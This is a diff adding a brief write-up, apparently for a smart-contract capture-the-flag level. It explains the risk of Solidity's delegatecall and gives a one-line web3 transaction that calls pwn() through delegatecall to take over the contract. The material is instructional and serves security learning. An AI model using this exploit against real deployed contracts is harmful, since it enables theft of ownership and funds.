@@ -1,0 +1,10 @@
+The low-level function delegatecall() can be implemented in insecure ways.
+
+## Explanation
+Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". 
+
+## Solution
+
+```javascript
+sendTransaction({ to: contract.address, data: web3.eth.abi.encodeFunctionSignature("pwn()"), from: player })
+```
